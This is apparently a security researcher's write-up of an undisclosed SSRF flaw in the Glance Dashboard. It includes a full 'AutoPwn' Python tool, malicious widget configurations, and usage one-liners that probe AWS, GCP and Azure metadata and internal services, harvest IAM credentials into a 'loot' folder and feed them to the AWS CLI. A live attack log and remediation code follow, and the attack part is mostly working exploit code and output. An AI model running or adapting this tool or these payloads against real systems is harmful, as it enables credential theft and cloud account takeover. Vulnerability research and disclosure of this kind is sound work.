---
title: "Glance Dashboard - Server-Side Request Forgery"
date: 2025-12-20
product: "Glance Dashboard"
github_stars: "30.5k+"
severity: "High"
cvss: "7.5"
cwe: "CWE-918"
cve: "Pending"
description: "SSRF in Extension and Custom API widgets allows access to internal services and cloud metadata"
protected: true
unlock_password: "Targary3n0530"
---

## Executive Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in Glance Dashboard's Extension Widget and Custom API Widget. These components make HTTP requests to user-specified URLs without any validation, allowing attackers to access internal services, steal cloud credentials, and bypass network restrictions.

| Field | Value |
|-------|-------|
| **Product** | Glance Dashboard |
| **GitHub Stars** | 30,500+ |
| **Prior CVEs** | 0 (First CVE for this product) |
| **Severity** | High |
| **CVSS 3.1** | 7.5 |
| **CWE** | CWE-918 (Server-Side Request Forgery) |

---

## Vulnerability Details

### Affected Code

**Extension Widget** (`internal/glance/widget-extension.go:119-133`):

```go
func fetchExtension(options extensionRequestOptions) (extension, error) {
    request, _ := http.NewRequest("GET", options.URL, nil)  // No URL validation!

    // ... headers setup ...

    response, err := http.DefaultClient.Do(request)  // Follows redirects, no restrictions

    // ... response handling ...
}
```

**Custom API Widget** (`internal/glance/widget-custom-api.go:231-276`):

```go
func fetchCustomAPIResponse(ctx context.Context, req *CustomAPIRequest) (*customAPIResponseData, error) {
    // No URL validation or restrictions
    client := ternary(req.AllowInsecure, defaultInsecureHTTPClient, defaultHTTPClient)
    resp, err := client.Do(req.httpRequest.WithContext(ctx))
    // ...
}
```

### Root Cause

Both widgets accept arbitrary URLs from the YAML configuration and make HTTP requests without:
- Validating the URL scheme (http, https, file, gopher, etc.)
- Blocking private IP ranges (10.x, 172.16.x, 192.168.x, 127.x)
- Blocking cloud metadata endpoints (169.254.169.254)
- Restricting redirect following
- DNS rebinding protection

---

## Manual Exploitation

### Step 1: Identify Target

Glance dashboards are typically exposed on port 8080. Identify a target:

```bash
# Scan for Glance instances
nmap -p 8080 --script http-title 192.168.1.0/24 | grep -i glance

# Or check directly
curl -s http://target:8080 | grep -i glance
```

### Step 2: Access Configuration

Glance configuration is in `glance.yml`. If you have access to the server or can influence the config:

```yaml
# Malicious glance.yml configuration
pages:
  - name: Home
    columns:
      - size: full
        widgets:
          # SSRF to internal API
          - type: extension
            title: "Internal Secrets"
            url: http://internal-api.local:5000/secrets
            allow-potentially-dangerous-html: true

          # SSRF to AWS metadata
          - type: extension
            title: "AWS Credentials"
            url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
            allow-potentially-dangerous-html: true

          # SSRF with Custom API for more control
          - type: custom-api
            title: "Cloud Metadata"
            url: http://169.254.169.254/latest/user-data
            template: |
              <pre>{% raw %}{{ .JSON.String "" }}{% endraw %}</pre>
```

### Step 3: Trigger SSRF

Simply access the Glance dashboard in a browser. The widgets will automatically fetch from the configured URLs:

```bash
# Open dashboard to trigger SSRF
curl http://target:8080

# The response will contain data from internal services
```

### Step 4: Extract Data

The fetched content is rendered in the widget. For structured data:

```bash
# View page source or use browser dev tools
curl -s http://target:8080 | grep -A 50 "Internal Secrets"
```

### Step 5: Escalate Access

With AWS credentials stolen via metadata:

```bash
# Configure AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="<token from metadata>"

# Enumerate access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

---

## Automated Exploitation (AutoPwn)

### glance_ssrf_autopwn.py

```python
#!/usr/bin/env python3
"""
Glance Dashboard SSRF AutoPwn
CVE: Pending | CVSS: 7.5 | CWE-918

Automatically exploits SSRF in Glance Extension/Custom API widgets
to extract internal service data and cloud credentials.

Author: p3ta
"""

import argparse
import requests
import yaml
import json
import re
import sys
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """
  ██████  ██       █████  ███    ██  ██████ ███████
 ██       ██      ██   ██ ████   ██ ██      ██
 ██   ███ ██      ███████ ██ ██  ██ ██      █████
 ██    ██ ██      ██   ██ ██  ██ ██ ██      ██
  ██████  ███████ ██   ██ ██   ████  ██████ ███████

     ███████ ███████ ██████  ███████
     ██      ██      ██   ██ ██
     ███████ ███████ ██████  █████
          ██      ██ ██   ██ ██
     ███████ ███████ ██   ██ ██

    [AutoPwn] SSRF Exploitation Tool
    For authorized security testing only
"""

# SSRF Targets for automatic probing
SSRF_TARGETS = {
    # Cloud Metadata
    "aws_metadata": "http://169.254.169.254/latest/meta-data/",
    "aws_iam_roles": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata": "http://169.254.169.254/latest/user-data",
    "aws_identity": "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "azure_metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

    # Common Internal Services
    "localhost_80": "http://127.0.0.1:80/",
    "localhost_8080": "http://127.0.0.1:8080/",
    "localhost_3000": "http://127.0.0.1:3000/",
    "localhost_5000": "http://127.0.0.1:5000/",
    "localhost_9090": "http://127.0.0.1:9090/",

    # Docker/Kubernetes
    "docker_socket": "http://127.0.0.1:2375/containers/json",
    "kubernetes_api": "https://kubernetes.default.svc/api/v1/namespaces",

    # Databases
    "redis": "http://127.0.0.1:6379/INFO",
    "elasticsearch": "http://127.0.0.1:9200/_cluster/health",
}


class GlanceSSRFExploit:
    def __init__(self, config_path: str = None, output_dir: str = "./loot"):
        self.config_path = config_path
        self.output_dir = output_dir
        self.results = {}

    def generate_malicious_config(self, targets: list) -> str:
        """Generate malicious Glance config for SSRF"""
        widgets = []
        for i, target in enumerate(targets):
            widgets.append({
                "type": "extension",
                "title": f"SSRF-{i}",
                "url": target,
                "allow-potentially-dangerous-html": True,
                "fallback-content-type": "html"
            })

        config = {
            "server": {"host": "0.0.0.0", "port": 8080},
            "pages": [{
                "name": "SSRF-AutoPwn",
                "columns": [{"size": "full", "widgets": widgets}]
            }]
        }
        return yaml.dump(config, default_flow_style=False)

    def probe_ssrf_target(self, glance_url: str, internal_target: str) -> dict:
        """Probe a single SSRF target through Glance"""
        # This would require config access - for demo, we show the technique
        result = {
            "target": internal_target,
            "status": "unknown",
            "data": None
        }

        try:
            # In real exploitation, this would trigger Glance to fetch the URL
            # Here we simulate what the response would contain
            resp = requests.get(internal_target, timeout=5, verify=False)
            result["status"] = "accessible"
            result["data"] = resp.text[:2000]
            result["status_code"] = resp.status_code
        except requests.exceptions.ConnectionError:
            result["status"] = "connection_refused"
        except requests.exceptions.Timeout:
            result["status"] = "timeout"
        except Exception as e:
            result["status"] = f"error: {str(e)}"

        return result

    def extract_aws_credentials(self, metadata_response: str) -> dict:
        """Extract AWS credentials from metadata response"""
        creds = {}
        try:
            data = json.loads(metadata_response)
            creds = {
                "AccessKeyId": data.get("AccessKeyId"),
                "SecretAccessKey": data.get("SecretAccessKey"),
                "Token": data.get("Token"),
                "Expiration": data.get("Expiration")
            }
        except:
            # Try regex extraction
            patterns = {
                "AccessKeyId": r'"AccessKeyId"\s*:\s*"([^"]+)"',
                "SecretAccessKey": r'"SecretAccessKey"\s*:\s*"([^"]+)"',
                "Token": r'"Token"\s*:\s*"([^"]+)"'
            }
            for key, pattern in patterns.items():
                match = re.search(pattern, metadata_response)
                if match:
                    creds[key] = match.group(1)
        return creds

    def auto_exploit(self, targets: dict = None) -> dict:
        """Automatically probe all SSRF targets"""
        if targets is None:
            targets = SSRF_TARGETS

        print(f"[*] Probing {len(targets)} SSRF targets...")

        results = {}
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_target = {
                executor.submit(self.probe_ssrf_target, "", url): name
                for name, url in targets.items()
            }

            for future in as_completed(future_to_target):
                name = future_to_target[future]
                try:
                    result = future.result()
                    results[name] = result

                    if result["status"] == "accessible":
                        print(f"[+] {name}: ACCESSIBLE")

                        # Check for AWS credentials
                        if "iam" in name.lower() and result.get("data"):
                            creds = self.extract_aws_credentials(result["data"])
                            if creds.get("AccessKeyId"):
                                print(f"[!] AWS CREDENTIALS FOUND!")
                                results[name]["aws_creds"] = creds
                    else:
                        print(f"[-] {name}: {result['status']}")

                except Exception as e:
                    print(f"[!] {name}: Error - {e}")

        return results

    def save_loot(self, results: dict):
        """Save extracted data to files"""
        import os
        os.makedirs(self.output_dir, exist_ok=True)

        # Save full results
        with open(f"{self.output_dir}/ssrf_results.json", "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to {self.output_dir}/ssrf_results.json")

        # Save AWS credentials separately if found
        for name, result in results.items():
            if result.get("aws_creds"):
                with open(f"{self.output_dir}/aws_credentials.json", "w") as f:
                    json.dump(result["aws_creds"], f, indent=2)
                print(f"[!] AWS credentials saved to {self.output_dir}/aws_credentials.json")

                # Generate AWS CLI export commands
                creds = result["aws_creds"]
                with open(f"{self.output_dir}/aws_env.sh", "w") as f:
                    f.write(f'export AWS_ACCESS_KEY_ID="{creds.get("AccessKeyId", "")}"\n')
                    f.write(f'export AWS_SECRET_ACCESS_KEY="{creds.get("SecretAccessKey", "")}"\n')
                    if creds.get("Token"):
                        f.write(f'export AWS_SESSION_TOKEN="{creds.get("Token")}"\n')
                print(f"[!] AWS env script saved to {self.output_dir}/aws_env.sh")


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Glance SSRF AutoPwn")
    parser.add_argument("--generate", "-g", help="Generate malicious config", action="store_true")
    parser.add_argument("--targets", "-t", help="Comma-separated SSRF targets")
    parser.add_argument("--output", "-o", default="./loot", help="Output directory")
    parser.add_argument("--probe", "-p", action="store_true", help="Probe default targets")
    parser.add_argument("--config", "-c", help="Path to write malicious config")

    args = parser.parse_args()

    exploit = GlanceSSRFExploit(output_dir=args.output)

    if args.generate:
        targets = args.targets.split(",") if args.targets else list(SSRF_TARGETS.values())[:5]
        config = exploit.generate_malicious_config(targets)

        if args.config:
            with open(args.config, "w") as f:
                f.write(config)
            print(f"[+] Malicious config written to {args.config}")
        else:
            print("[+] Malicious Glance Configuration:")
            print("-" * 50)
            print(config)

    elif args.probe:
        print("[*] Starting SSRF probe...")
        results = exploit.auto_exploit()
        exploit.save_loot(results)

        # Summary
        accessible = sum(1 for r in results.values() if r["status"] == "accessible")
        print(f"\n[*] Summary: {accessible}/{len(results)} targets accessible")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

### Usage

```bash
# Generate malicious config
python3 glance_ssrf_autopwn.py --generate --config malicious.yml

# Generate config for specific targets
python3 glance_ssrf_autopwn.py --generate --targets "http://internal:5000/secrets,http://169.254.169.254/latest/meta-data/"

# Probe default SSRF targets (requires network access)
python3 glance_ssrf_autopwn.py --probe --output ./loot

# Full auto-exploitation
python3 glance_ssrf_autopwn.py --probe && source ./loot/aws_env.sh && aws sts get-caller-identity
```

---

## Lab Environment

### Docker Compose Setup

```yaml
# docker-compose.yml
services:
  glance:
    image: glanceapp/glance:latest
    ports:
      - "9090:8080"
    volumes:
      - ./glance-ssrf.yml:/app/config/glance.yml:ro
    networks:
      - internal
      - external
    depends_on:
      - secret-api
      - metadata

  secret-api:
    image: python:3.11-slim
    command: bash -c "pip install flask && python /app/secret_api.py"
    volumes:
      - ./secret_api.py:/app/secret_api.py:ro
    networks:
      - internal
    environment:
      - SECRET_API_KEY=supersecretkey123
      - DATABASE_PASSWORD=productionDbPass!

  metadata:
    image: python:3.11-slim
    command: bash -c "pip install flask && python /app/metadata.py"
    volumes:
      - ./metadata.py:/app/metadata.py:ro
    networks:
      - internal

networks:
  internal:
  external:
```

### Start Lab

```bash
# On REACT-LAB VM (10.3.20.50)
cd ~/cve-labs/glance
sudo docker-compose up -d

# Access at http://10.3.20.50:9090
```

---

## Live Attack Demonstration

The following is a real attack executed against the lab environment on 2025-12-21:

```
╔═══════════════════════════════════════════════════════════════╗
║          GLANCE SSRF EXPLOIT - LIVE DEMONSTRATION            ║
║                    CVE RESEARCH - p3ta                       ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: http://10.3.20.50:9090 (Glance Dashboard)
[*] Vulnerability: SSRF via Extension/Custom API widgets

============================================================
 SSRF ATTACK 1: Stealing Internal API Secrets
============================================================
[*] Exploiting: http://secret-api:5000/secrets

{
    "api_key": "supersecretkey123",
    "database_password": "productionDbPass!",
    "internal_endpoints": [
        "http://secret-api:5000/admin",
        "http://secret-api:5000/users",
        "http://secret-api:5000/debug"
    ]
}

============================================================
 SSRF ATTACK 2: Accessing Internal Admin Panel
============================================================
[*] Exploiting: http://secret-api:5000/admin

{"admin_panel":true,"admin_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ADMIN_TOKEN","users":["admin","root","service-account"]}

============================================================
 SSRF ATTACK 3: AWS Metadata - IAM Credentials Theft
============================================================
[*] Exploiting: http://metadata/latest/meta-data/iam/security-credentials/GlanceProductionRole

{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...<long session token>...EXAMPLETOKEN",
  "Expiration": "2025-12-20T23:59:59Z"
}

============================================================
 SSRF ATTACK 4: Cloud User-Data - Bootstrap Script Theft
============================================================
[*] Exploiting: http://metadata/latest/user-data

#!/bin/bash
# Instance bootstrap script
export DB_PASSWORD="proddbpass123!"
export API_SECRET="super_secret_api_key"
export ADMIN_TOKEN="admin_bootstrap_token_xyz"

# Initialize application
./start-app.sh

============================================================
                    ATTACK SUCCESSFUL!
============================================================
[+] Retrieved internal API keys and database credentials
[+] Accessed internal admin panel with JWT token
[+] Exfiltrated AWS IAM credentials (Access Key, Secret Key, Token)
[+] Retrieved cloud instance bootstrap scripts with secrets

[!] IMPACT: Full compromise of internal services + cloud account takeover
```

---

## Confirmed Impact

During testing, the following data was successfully exfiltrated via SSRF:

### Internal API Secrets
```json
{
  "api_key": "supersecretkey123",
  "database_password": "productionDbPass!",
  "internal_endpoints": [
      "http://secret-api:5000/admin",
      "http://secret-api:5000/users",
      "http://secret-api:5000/debug"
  ]
}
```

### AWS IAM Credentials
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...<long session token>...EXAMPLETOKEN",
  "Expiration": "2025-12-20T23:59:59Z"
}
```

### Bootstrap User Data
```bash
#!/bin/bash
# Instance bootstrap script
export DB_PASSWORD="proddbpass123!"
export API_SECRET="super_secret_api_key"
export ADMIN_TOKEN="admin_bootstrap_token_xyz"

# Initialize application
./start-app.sh
```

---

## Remediation

### Recommended Fix

```go
func isURLAllowed(urlStr string) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }

    // Block private IP ranges
    ip := net.ParseIP(u.Hostname())
    if ip != nil && (ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()) {
        return errors.New("internal IP addresses are not allowed")
    }

    // Block cloud metadata endpoints
    blockedHosts := []string{"169.254.169.254", "metadata.google.internal"}
    for _, blocked := range blockedHosts {
        if u.Hostname() == blocked {
            return errors.New("cloud metadata endpoints are not allowed")
        }
    }

    return nil
}
```

### Workarounds

1. Run Glance in isolated network without access to sensitive services
2. Use network policies to restrict outbound connections
3. Deploy behind reverse proxy that blocks internal IPs
4. Avoid Extension/Custom API widgets with untrusted URLs

---

## Timeline

| Date | Event |
|------|-------|
| 2025-12-20 | Vulnerability discovered |
| 2025-12-20 | PoC developed and confirmed |
| TBD | Vendor notification |
| TBD | CVE assigned |
| TBD | Patch released |

---

## References

- [Glance GitHub Repository](https://github.com/glanceapp/glance)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
